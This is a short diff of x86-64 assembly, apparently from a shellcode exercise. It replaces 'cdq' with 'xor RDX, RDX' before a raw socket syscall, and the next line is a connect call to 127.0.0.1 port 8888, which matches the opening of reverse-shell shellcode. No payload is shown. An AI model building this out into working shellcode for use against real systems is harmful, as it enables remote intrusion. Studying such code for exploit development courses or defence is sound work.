@@ -8,9 +8,9 @@ global _start
 _start:
 	; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
 	mov RAX, 0x29
-	cdq
 	mov RDI, 2
 	mov RSI, 1
+	xor RDX, RDX
 	syscall
 
 	; connect(sockfd, {sa_family=AF_INET, sin_port=htons(8888), sin_addr=inet_addr("127.0.0.1")}, 16)
